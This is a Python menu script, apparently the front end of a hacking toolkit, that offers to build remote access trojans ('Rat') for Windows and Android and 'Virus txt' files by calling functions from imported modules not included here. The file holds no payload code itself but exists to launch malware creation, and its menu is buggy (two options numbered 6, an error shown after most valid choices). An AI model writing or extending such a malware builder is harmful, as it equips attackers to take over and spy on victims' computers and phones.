# -*- coding: utf-8 -*-
import subprocess
import os
import time , sys
from colorama import Fore as c
from rat_windos import *
from rat_android import *
from baj_windows import *
from virus_txt_windows import *
from virus_txt_android import *
if os.name == 'nt':
    
    os.system('cls')
else:
    os.system('clear')
def pr(txt):
    for x in txt:
        print(x, end='', flush=True)  
        time.sleep(0.001)   
def banner():
    pr(c.GREEN+'''
   
┌─┐┬  ┌─┐  ┌─┐┌─┐┌─┐┬ ┬┬─┐┬┌┬┐┬ ┬   ┌─┐┬ ┬┌┐ ┌─┐┬─┐
├┤ │  ├┤   └─┐├┤ │  │ │├┬┘│ │ └┬┘   │  └┬┘├┴┐├┤ ├┬┘
└─┘┴─┘└────└─┘└─┘└─┘└─┘┴└─┴ ┴  ┴────└─┘ ┴ └─┘└─┘┴└─
   ''')

    pr(c.CYAN+"Craeted By : @e_l_f_6_6_6")
    pr(f'''
{c.RED}|-------------------------+
{c.RED}|
{c.RED}|--{c.YELLOW}>{c.LIGHTCYAN_EX}[1]{c.GREEN} Creat Rat Windows..!
{c.RED}|
{c.RED}|----{c.YELLOW}>{c.LIGHTCYAN_EX}[2]{c.GREEN} Creat Rat Andorid..!
{c.RED}|
{c.RED}|------{c.YELLOW}>{c.LIGHTCYAN_EX}[3]{c.GREEN} Creat Baj Windows..!
{c.RED}|
{c.RED}|--------{c.YELLOW}>{c.LIGHTCYAN_EX}[4]{c.GREEN} Creat Baj Android..!
{c.RED}|
{c.RED}|----------{c.YELLOW}>{c.LIGHTCYAN_EX}[5]{c.GREEN} Creat Virus txt windows..!
{c.RED}|
{c.RED}|------------{c.YELLOW}>{c.LIGHTCYAN_EX}[6]{c.GREEN} Creat Virus txt Android..!
{c.RED}|
{c.RED}|--------------{c.YELLOW}>{c.LIGHTCYAN_EX}[6]{c.GREEN} Exit..!
{c.RED}|
{c.RED}|--------------------------------------------------+

   ''')
while True:
    if os.name == 'nt':
    
        os.system('cls')
    else:
        os.system('clear') 
    banner()
    result = input(f'{c.WHITE}root&@elf:~# {c.YELLOW} Enter The Number: {c.LIGHTMAGENTA_EX}')
    if result == '1':
        rat_windows_1()
        shell()
        
    if result == '2':
        rat_1()
        panel_1()
        
    if result == '3':
        
        windows_baj()

    if result == '4':
        baj_android()


    if result == '5':
        not_pad()
        
    if result == '6':
        txt()
    
    if result == '7':
        sys.exit()
    else:
        if os.name == 'nt':
            
            os.system('cls')
        else:
            os.system('clear')
        pr(f'{c.RED}Error')
        time.sleep(5)




